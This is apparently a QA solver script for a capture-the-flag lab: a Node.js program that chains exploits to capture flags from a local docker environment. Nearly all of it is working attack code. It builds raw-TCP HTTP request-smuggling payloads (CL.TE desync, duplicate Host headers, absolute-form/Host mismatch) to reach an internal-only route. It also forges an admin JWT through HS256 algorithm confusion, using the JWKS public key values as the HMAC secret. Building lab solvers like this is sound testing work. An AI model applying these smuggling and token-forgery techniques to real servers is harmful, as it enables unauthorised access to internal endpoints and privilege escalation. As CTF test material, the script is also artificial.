#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV CHAIN C (edge-led), full mode (FR-14, arch §5.3).
 *
 *   M1 request smuggling through edge.aslv.lab (raw TCP desync between
 *     edge-front and edge-back) reaches the unrouted /internal/flag …
 *     ………………………………………………………………………………… flag ASLV{HTTP-...}   (CORE)
 *   → attempt /internal/admin-token on the internal zone (edge-back source
 *     ships NO such route → documented SKIP with WARN)
 *   → M4 /admin/v1/panel with an elevated bearer — the M5→M4 trust edge
 *     (HS256 algorithm confusion: HMAC secret = JWKS n + "." + e) …
 *     ………………………………………………………………………………… flag ASLV{API-...}   (BONUS)
 *
 * Env: FULL_URL (default http://localhost:18024 — the full profile gateway).
 * Node 20+ built-ins only. Exit 0 when the core HTTP flag is captured; the
 * admin-token hop is probed and the M4 panel attempted as a bonus (the
 * current gateway routes only /user/v1/* to M4 — see qa/README.md gaps).
 */
import net from 'node:net';
import http from 'node:http';
import crypto from 'node:crypto';

const FULL_URL = process.env.FULL_URL || 'http://localhost:18024';
const BASE = new URL(FULL_URL);
const GW_HOST = BASE.hostname;
const PORT = Number(BASE.port || 80);
const EDGE_VHOST = `edge.aslv.lab:${PORT}`;
const AUTH_HOST = `auth.aslv.lab:${PORT}`;
const API_HOST = `aslv.lab:${PORT}`;
const HTTP_FLAG_RE = /ASLV\{HTTP-\d{9,10}\}/;
const API_FLAG_RE = /ASLV\{API-\d{9,10}\}/;
const DIRECT_PORTS = process.env.M1_DIRECT_URL
  ? [Number(new URL(process.env.M1_DIRECT_URL).port || 80)]
  : (PORT === 18024 ? [18028] : [18027]);

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const warn = (m) => console.log(`[!] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ------------------------------------------------------------- raw TCP (M1) */
function rawExchange(port, payload, { timeoutMs = 8000, quietMs = 700, host = GW_HOST } = {}) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let settled = false;
    let quietTimer = null;
    const sock = net.connect({ host, port });
    const finish = (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(quietTimer);
      sock.destroy();
      if (err) reject(err);
      else resolve({ text: Buffer.concat(chunks).toString('latin1'), bytes: Buffer.concat(chunks).length });
    };
    const arm = () => { clearTimeout(quietTimer); quietTimer = setTimeout(() => finish(), quietMs); };
    sock.setTimeout(timeoutMs);
    sock.on('connect', () => { sock.write(payload); arm(); });
    sock.on('data', (c) => { chunks.push(c); arm(); });
    sock.on('timeout', () => finish());
    sock.on('close', () => finish());
    sock.on('error', (e) => finish(e));
  });
}

async function portOpen(port) {
  try {
    const r = await rawExchange(port, 'GET /healthz HTTP/1.1\r\nHost: edge.aslv.lab\r\nConnection: close\r\n\r\n', { timeoutMs: 3000, quietMs: 400 });
    return /HTTP\/1\.[01] 200/.test(r.text) || /edge-back/.test(r.text);
  } catch (_) { return false; }
}

/* smuggle N bytes of GET <path> with the internal Host (built per target path) */
const smuggledFor = (path) => `GET ${path} HTTP/1.1\r\nHost: internal.aslv.lab\r\nX-Vlh-Solver: 1\r\n\r\n`;
const findFlag = (text, re) => re.exec(text)?.[0] || null;

async function directLeftoverSmuggle(port, path) {
  const body = 'q=desync';
  const payload =
    'POST /app/search HTTP/1.1\r\nHost: edge.aslv.lab\r\n'
    + 'Content-Type: application/x-www-form-urlencoded\r\n'
    + `Content-Length: ${Buffer.byteLength(body)}\r\n\r\n${body}${smuggledFor(path)}`;
  const r = await rawExchange(port, payload);
  return r;
}

async function directDupHostBypass(port, path) {
  const payload =
    `GET ${path} HTTP/1.1\r\nHost: edge.aslv.lab\r\nHost: internal.aslv.lab\r\nConnection: close\r\n\r\n`;
  return rawExchange(port, payload);
}

async function gatewayAbsFormMismatch(path) {
  const payload =
    `GET http://edge.aslv.lab${path} HTTP/1.1\r\nHost: internal.aslv.lab\r\nConnection: close\r\n\r\n`;
  return rawExchange(PORT, payload, { host: GW_HOST });
}

async function gatewayPrechunkedSmuggle(path) {
  const body = `0\r\n\r\n${smuggledFor(path)}`;
  const a =
    'POST /app/search HTTP/1.1\r\n'
    + `Host: ${EDGE_VHOST}\r\n`
    + 'Content-Type: application/x-www-form-urlencoded\r\n'
    + `Content-Length: ${Buffer.byteLength(body, 'latin1')}\r\n\r\n${body}`;
  const b = `GET /app HTTP/1.1\r\nHost: ${EDGE_VHOST}\r\nConnection: close\r\n\r\n`;
  return rawExchange(PORT, a + b, { host: GW_HOST, timeoutMs: 9000, quietMs: 800 });
}

/* Run the full attempt battery for one internal target path; resolves the
 * raw text of whichever attempt succeeded (or null). */
async function reachInternal(path) {
  /* 1. direct edge-front port if exposed (deterministic bench) */
  for (const port of DIRECT_PORTS) {
    if (!(await portOpen(port))) {
      warn(`[M1] direct edge-front port ${port} not exposed (see qa/README.md known gaps)`);
      break;
    }
    ok(`[M1] direct edge-front port ${port} reachable`);
    for (const [name, fn] of [['CL.TE leftover smuggle', directLeftoverSmuggle], ['duplicate-Host bypass', directDupHostBypass]]) {
      log(`[M1] direct ${name} → ${path}`);
      try {
        const r = await fn(port, path);
        if (/HTTP\/1\.[01] 200/.test(r.text)) return { via: `direct ${name}`, text: r.text };
      } catch (e) { warn(`[M1] direct ${name} error: ${e.message}`); }
    }
  }
  /* 2. through the gateway: absolute-form-vs-Host mismatch */
  try {
    log(`[M1] gateway absolute-form-vs-Host mismatch → ${path}`);
    const r = await gatewayAbsFormMismatch(path);
    if (/HTTP\/1\.[01] 200/.test(r.text)) return { via: 'gateway absolute-form mismatch', text: r.text };
  } catch (e) { warn(`[M1] gateway absolute-form attempt error: ${e.message}`); }
  /* 3. through the gateway: pre-chunked CL.TE smuggle (retries) */
  for (let i = 1; i <= 4; i++) {
    try {
      log(`[M1] gateway pre-chunked CL.TE smuggle (${i}/4) → ${path}`);
      const r = await gatewayPrechunkedSmuggle(path);
      if (findFlag(r.text, HTTP_FLAG_RE) || /HTTP\/1\.[01] 200/.test(r.text)) {
        return { via: `gateway pre-chunked smuggle (attempt ${i})`, text: r.text };
      }
    } catch (e) { warn(`[M1] gateway smuggle attempt ${i} error: ${e.message}`); }
    await sleep(300);
  }
  return null;
}

/* ------------------------------------------------------------- http helper */
function request(method, path, { host, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const h = { ...headers };
    if (host) h.host = host;
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(6000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    req.end();
  });
}

const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');

async function main() {
  log(`CHAIN C target: ${FULL_URL} (edge-led: M1 smuggling → internal zone → M4 elevation)`);

  /* probe the gateway */
  try {
    const r = await rawExchange(PORT, 'GET /healthz HTTP/1.1\r\nHost: edge.aslv.lab\r\nConnection: close\r\n\r\n', { timeoutMs: 4000, quietMs: 500 });
    if (!/HTTP\/1\.[01] \d{3}/.test(r.text)) throw new Error('gateway did not answer');
    ok('[M1] gateway reachable (edge vhost answered /healthz)');
  } catch (e) {
    die(`cannot reach the full-mode gateway at ${FULL_URL}: ${e.message} — docker compose --profile full up -d`);
  }

  /* -------------------------------------------------- core: M1 → HTTP flag */
  const hit = await reachInternal('/internal/flag');
  const flags = {};
  if (!hit) {
    die('[M1] could not reach /internal/flag through the edge (check EDGE_MODE=cl-te and the direct edge-front port 18028)');
  }
  flags.HTTP = findFlag(hit.text, HTTP_FLAG_RE);
  if (!flags.HTTP) {
    die(`[M1] the internal zone answered but no ASLV{HTTP-...} in the response (via ${hit.via}): ${hit.text.slice(0, 300)}`);
  }
  ok(`[M1] HTTP flag: ${flags.HTTP} (via ${hit.via})`);

  /* ------------------------------------------ documented hop: admin-token */
  log('[M1] probing /internal/admin-token on the internal zone (per chain table)');
  const tokenHit = await reachInternal('/internal/admin-token');
  if (tokenHit) {
    const status = (tokenHit.text.match(/HTTP\/1\.[01] \d{3}/g) || []).join(', ');
    if (/no such internal resource|404/.test(tokenHit.text)) {
      warn(`[M1] /internal/admin-token does not exist on edge-back (${status}) — documented SKIP (the route was never shipped; see modules/aslv-edge/cmd/edgeback/main.go route table)`);
    } else {
      const tok = /[A-Za-z0-9._-]{20,}/.exec(tokenHit.text)?.[0];
      warn(`[M1] /internal/admin-token answered unexpectedly (${status}) — inspect manually: ${tokenHit.text.slice(0, 160)}`);
      if (tok) log(`[M1] captured candidate token: ${tok}`);
    }
  } else {
    warn('[M1] /internal/admin-token unreachable — documented SKIP (no such route on edge-back)');
  }

  /* --------------------------------- bonus: M4 panel with an elevated bearer */
  log('[M4] attempting /admin/v1/panel with the M5→M4 trust-edge bearer (HS256 confusion)');
  try {
    const dir = await request('GET', '/directory', { host: AUTH_HOST });
    const innocent = dir.json?.users?.find((u) => u.role === 'innocent');
    const jwksRes = await request('GET', '/jwks.json', { host: AUTH_HOST });
    const key = jwksRes.json?.keys?.[0];
    if (!innocent || !key || !key.n || !key.e) throw new Error('M5 directory/JWKS unavailable');
    const hh = b64u({ alg: 'HS256', typ: 'JWT', kid: key.kid || 'chain-c' });
    const pc = b64u({ sub: innocent.uuid, role: 'admin', iat: Math.floor(Date.now() / 1000) });
    const sg = crypto.createHmac('sha256', `${key.n}.${key.e}`).update(`${hh}.${pc}`).digest('base64url');
    /* KNOWN GATEWAY GAP (qa/README.md): gateway-full routes only /user/v1/* to
     * M4, so /admin/v1/panel currently lands on the portal — try the canonical
     * host plus plausible future routings. */
    let panel = null;
    for (const host of [API_HOST, `api.aslv.lab:${PORT}`, `admin.aslv.lab:${PORT}`]) {
      const r = await request('GET', '/admin/v1/panel', { host, headers: { authorization: `Bearer ${hh}.${pc}.${sg}` } });
      log(`[M4] /admin/v1/panel via ${host}: ${r.status}`);
      if (r.status !== 404) { panel = r; break; }
    }
    if (panel && panel.status === 200 && panel.json?.flag && API_FLAG_RE.test(panel.json.flag)) {
      flags.API = panel.json.flag2 || panel.json.flag;
      ok(`[M4] API flag (bonus): ${flags.API}`);
    } else {
      warn('[M4] /admin/v1/panel not routed to M4 by the current gateway (only /user/v1/ is) — API flag skipped as bonus, see qa/README.md known gaps');
    }
  } catch (e) {
    warn(`[M4] bonus panel attempt failed: ${e.message} (chain core is unaffected)`);
  }

  if (!flags.HTTP) die('chain C incomplete — the core HTTP flag was not captured');
  console.log('\n=== CHAIN C (edge-led): CORE FLAG CAPTURED ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${FULL_URL} (${e.code}) — is the full profile running?  docker compose --profile full up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
